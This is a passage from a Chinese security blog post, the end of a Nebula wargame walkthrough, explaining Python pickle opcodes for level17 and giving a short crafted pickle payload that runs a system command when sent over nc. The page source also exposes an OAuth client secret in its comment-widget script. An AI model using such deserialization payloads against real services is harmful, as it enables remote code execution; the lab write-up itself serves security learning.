<p>看到<code>pickle</code>，很明显，应该是反序列化问题，与传统的对象反序列化不同，python反序列化可能执行<code>shellcode</code>,除了可以序列化对象，也可以通过操作码，反序列化出代码：</p>
<blockquote>
<p>想要使用模块，则用操作码c，比如这关要使用到os模块，则：cos;如果要使用python内置函数，则是：c<strong>builtin</strong>。 想要使用一个字符串，则S’字符串’ 想要把参数带入“栈”中调用函数，则(S’参数’，官方叫它MARK对象 t操作码则是从栈顶开始弹出所有值，包括MARK对象。 R则pop栈顶两项内容最后，”.”代表pickle结束标志。</p>
</blockquote>
<p>所以可以新建一个<code>/tmp/sc</code>，内容如下：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built-in">cos</span></div><div class="line"><span class="keyword">system</span></div><div class="line">(S<span class="string">'getflag&gt;/tmp/level17'</span></div><div class="line">tR.</div></pre></td></tr></table></figure>
<p>然后传入nc连接即可</p>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:</strong>
    empty_xl
  </li>
  <li class="post-copyright-link">
    <strong>Post link:</strong>
    <a href="http://yoursite.com/blog/exploit-exercises-nebula/" title="linux suid提权 & 渗透测试练习nebula">http://yoursite.com/blog/exploit-exercises-nebula/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice: </strong>
    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> unless stating additionally.
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/penetration-testing/" rel="tag"><i class="fa fa-tag"></i> penetration testing</a>
          
            <a href="/tags/nebula/" rel="tag"><i class="fa fa-tag"></i> nebula</a>
          
            <a href="/tags/suid/" rel="tag"><i class="fa fa-tag"></i> suid</a>
          
            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/blog/weblogic/" rel="next" title="Weblogic 常见漏洞分析">
                <i class="fa fa-chevron-left"></i> Weblogic 常见漏洞分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/blog/exploit-exercises-vulnhub-01/" rel="prev" title="vulnhub 渗透测试练习 lampiao & FristiLeaks">
                vulnhub 渗透测试练习 lampiao & FristiLeaks <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
    <script>
    var gitment = new Gitment({
      // 根据文章标题设置唯一评论id
    // id: '', // optional
    owner: 'emptyxl',
    repo: 'emptyxl.github.io',
    oauth: {
      client_id: 'fa7413e3c0207a96ae03',
      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
      }
    })
    gitment.render('comments')
    </script>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.png"
               alt="empty_xl" />
          <p class="site-author-name" itemprop="name">empty_xl</p>
           
              <p class="site-description motion-element" itemprop="description">Hacked By_ EmPTy_xL../ security blog </p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">50</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">33</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">76</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/emptyxl" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      Github
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="/mail/index.html" target="_blank" title="E-Mail">
                  
                    <i class="fa fa-fw fa-envelope"></i>
                  
                    
                      E-Mail
                    
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux-suid提权"><span class="nav-number">1.</span> <span class="nav-text">linux suid提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux特殊权限"><span class="nav-number">1.1.</span> <span class="nav-text">linux特殊权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID"><span class="nav-number">1.1.1.</span> <span class="nav-text">SUID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SGID-amp-SBIT"><span class="nav-number">1.1.2.</span> <span class="nav-text">SGID & SBIT</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SGID"><span class="nav-number">1.1.2.1.</span> <span class="nav-text"># SGID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SBIT"><span class="nav-number">1.1.2.2.</span> <span class="nav-text"># SBIT</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用SUID提权"><span class="nav-number">1.2.</span> <span class="nav-text">利用SUID提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试练习-——-nebula"><span class="nav-number">2.</span> <span class="nav-text">渗透测试练习 —— nebula</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level00"><span class="nav-number">2.1.</span> <span class="nav-text">level00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level01"><span class="nav-number">2.2.</span> <span class="nav-text">level01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level02"><span class="nav-number">2.3.</span> <span class="nav-text">level02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level03"><span class="nav-number">2.4.</span> <span class="nav-text">level03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level04"><span class="nav-number">2.5.</span> <span class="nav-text">level04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level05"><span class="nav-number">2.6.</span> <span class="nav-text">level05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level06"><span class="nav-number">2.7.</span> <span class="nav-text">level06</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level07"><span class="nav-number">2.8.</span> <span class="nav-text">level07</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level08"><span class="nav-number">2.9.</span> <span class="nav-text">level08</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level09"><span class="nav-number">2.10.</span> <span class="nav-text">level09</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-number">2.11.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11"><span class="nav-number">2.12.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level12"><span class="nav-number">2.13.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level13"><span class="nav-number">2.14.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14"><span class="nav-number">2.15.</span> <span class="nav-text">level14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level15"><span class="nav-number">2.16.</span> <span class="nav-text">level15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level16"><span class="nav-number">2.17.</span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level17"><span class="nav-number">2.18.</span> <span class="nav-text">level17</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    
    &emsp;&emsp;|&emsp;
  </span>
  <span class="author" itemprop="copyrightHolder">empty_xl</span>
</div>


<div class="powered-by">
  
  Power &mdash; Hexo
</div>

<div class="theme-info">
  
  Theme &mdash; NexT.Mist
</div>
<div>
<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  

  

  

</body>
</html>
